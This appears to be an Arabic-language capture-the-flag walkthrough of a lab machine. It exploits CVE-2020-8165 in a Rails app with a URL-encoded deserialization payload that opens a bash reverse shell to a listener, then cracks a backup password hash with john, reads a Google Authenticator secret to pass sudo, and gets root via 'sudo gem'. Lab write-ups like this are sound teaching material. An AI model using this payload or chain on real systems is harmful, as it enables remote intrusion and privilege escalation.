

 ![Desktop View](/img/jw/0.png)


# Sammmry:


web appاثناء الفحص نجد ان  
نستغلها
CVE-2020-8165 مصابة ب 

shell للحصول على

ثم نقوم بالبحث داخل السيرفر لنجد كلمة سر  
sudo

 john مشفرة نقوم بفكها ب

 verification codeبعد تخطي

gem مسموح له استخدام  user  نجد ان

sudo  ب


- sammmry
- 1 Recon
   - 1.1 nmap
   - 1.2 Port
- 2 CVE-2020-8165
   - 2.1 Create new user
   - 2.2 Burp suite
   - 2.3 exploit.
   - 2.4 Got shell
- 3 User
   - 3.1 john
   - 3.2 gauth
- 4 privesclation
   - 4.1 sudo gem


## 1 Recon

### 1.1 nmap

nmap ‫نبدا‬  بفحص البورتات باستخدام  


 ![Desktop View](/img/jw/1.png)

‫‪8000‬‬ ‫و‬ ‫‪8080‬‬

‫‪web‬‬ ‫‪server‬‬ ‫شغالين‬

### 1.2 Port

 ![Desktop View](/img/jw/2.png)


 CVE-2020-8165 السيرفر مصاب ب


## 2 CVE-2020-8165

### 2.1 Create new user
نقوم بانشاء  مستخدم جديد


 ![Desktop View](/img/jw/3.png)


 ![Desktop View](/img/jw/4.png)

 profile نذهب الى

### 2.2 Burp suite

burp suite نشغل

Proxy on

 ![Desktop View](/img/jw/5.png)

update userثم نضغط

requestثم نلتقط


 ![Desktop View](/img/jw/6.png)
 



### 2.3 exploit

 ‫‪send to repeater‬‬  نقوم بالضغط على الزر الايمن للفارة ثم نضغط


  ![Desktop View](/img/jw/7.png)


 : بالبايلود الخاص بنا username variableنقوم بتغير

 ```
 %04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedIn
stanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%4
0srcI%22E%60%2Fbin%2Fbash+-c+%22%2Fbin%2fbash+-
i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.212%2F4444+0%3E%261%22%60%0
6%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linen
oi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result
%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADepr
ecation%00%06%3B%09T
```

غير10.10.14.212الى

 الخاص بك host 

nc –lnvp 4444 نشغل

 send ثم نضغط


  ![Desktop View](/img/jw/8.png)

  ![Desktop View](/img/jw/9.png)


 قم بتصفح



 http://10.10.10.212/articles



  ![Desktop View](/img/jw/10.png)

 ### 2.4 Got shell

  ![Desktop View](/img/jw/11.png)

## 3 User

### 3.1 john

في المسار التالي hash بالبحث داخل السيرفر نجد

/var/backups/dump_2020-08-27.sql

 john نضعه في ملف ثم نقوم بفك 
 تشفيره باستخدام

spongebobنجد كلمة سر

نشغل الامر


```
Sudo –l

```
نكتب كلمة السر

spongebob   


كلمة السر صحيحة لكن يطلب منا

verification code


![Desktop View](/img/jw/12.png)

/home/billعند البحث داخل السيرفر نجد في

.google_authenticator


![Desktop View](/img/jw/14.png)


GAuth Authenticatorنجد بداخله

 نذهب الى الموقع

 https://gauth.apps.gbraad.nl


  ![Desktop View](/img/jw/15.png)

  ![Desktop View](/img/jw/16.png)



verification codeحصلنا على


  ![Desktop View](/img/jw/17.png)


## 4 privesclation

### 4.1 sudo gem

 gem نجد اليوزر مسموح له

 /usr/bing/gem


 gem ونبحث عن gtfbobinsنذهب الى موقع

  ![Desktop View](/img/jw/19.png)


  ![Desktop View](/img/jw/20.png)


 نقوم بكتابة الامر التالي

```sudo gem open -e "/bin/sh -c /bin/sh" rdoc```



  ![Desktop View](/img/jw/21.png)

# rootحصلنا على
